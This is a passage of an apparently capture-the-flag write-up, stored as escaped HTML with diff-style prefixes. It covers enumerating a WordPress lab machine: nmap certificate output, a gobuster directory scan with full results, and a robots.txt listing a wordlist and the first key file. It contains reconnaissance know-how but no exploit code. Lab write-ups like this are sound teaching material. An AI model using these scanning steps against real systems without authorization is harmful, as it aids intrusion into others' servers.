+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|_http-title: Site doesn&amp;#39;&lt;/span&gt;t have a title &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;text/html&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssl-cert: Subject: commonName&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;www.example.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Issuer: commonName&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;www.example.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Public Key type: rsa
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Public Key bits: &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Signature Algorithm: sha1WithRSAEncryption
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Not valid before: 2015-09-16T10:45:03
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Not valid after:  2025-09-13T10:45:03
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| MD5:   3c16 3b19 87c3 42ad &lt;span style=&#34;color:#ae81ff&#34;&gt;6634&lt;/span&gt; c1c9 d0aa fb97
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From our scan we can observe that port 80 (http) and 443 (https) are open. So our endpoint or point of entry must be tied to the web content.
+Our next step is to enumerate the url and try to find directories or files. We will use &lt;a href=&#34;https://github.com/OJ/gobuster&#34;&gt;GoBuster&lt;/a&gt; and for our wordlists to enumerate we will use Discovery wordlist from &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;SecLists&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;A snippet of our directory and files enumeration.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt; gobuster dir -u http://10.10.103.189 -w /SecLists/Discovery/Web-content/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023/03/01 21:34:50 Starting gobuster in directory enumeration mode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/.hta                 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 213&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/.htaccess            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 218&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/.htpasswd            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 218&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/0                    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/0/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/Image                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/Image/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/admin                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 235&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/admin/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/atom                 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/feed/atom/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/audio                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 235&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/audio/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/blog                 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 234&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/blog/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/css                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 233&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/css/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/dashboard            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 302&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/wp-admin/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/favicon.ico          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/feed                 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/feed/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/image                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/image/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/images               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 236&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/images/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/index.html           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 1104&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/index.php            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/js                   &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 232&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/js/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/intro                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 516314&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/license              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 309&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/login                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 302&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/wp-login.php&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/page1                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/phpmyadmin           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 403&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 94&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/rdf                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/feed/rdf/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/readme               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 64&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/render/https://www.google.com &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/render/https:/www.google.com&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/robots               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 41&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/robots.txt           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 41&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/rss                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/feed/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/rss2                 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/feed/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/sitemap              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/sitemap.xml          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/video                &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 235&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/video/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-admin             &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 238&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/wp-admin/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-content           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 240&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/wp-content/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-includes          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 301&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 241&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/wp-includes/&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-config            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-cron              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-load              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-links-opml        &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 227&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-login             &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 2613&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-mail              &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 500&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 3064&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-settings          &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 500&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/wp-signup            &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 302&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;--&amp;gt; http://10.10.103.189/wp-login.php?action&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;register&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/xmlrpc               &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 405&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 42&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/xmlrpc.php           &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Status: 405&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Size: 42&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Progress: &lt;span style=&#34;color:#ae81ff&#34;&gt;4713&lt;/span&gt; / &lt;span style=&#34;color:#ae81ff&#34;&gt;4714&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;99.98%&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;===============================================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023/03/01 21:48:41 Finished
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;From our enumeration we can observe that the site uses wordpress since our login is redirected to /wp-login.php. We can check out the other files such as the /license, /readme, /sitemap and most importantly /robots.txt.&lt;/p&gt;
+&lt;p&gt;In &lt;code&gt;robots.txt&lt;/code&gt; we can find two interesting files.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-url&#34; data-lang=&#34;url&#34;&gt;http://10.10.103.189/robots.txt
+
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have found the first key needed to solve our challenge. Lets retrieve the key and the other file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://10.10.103.189
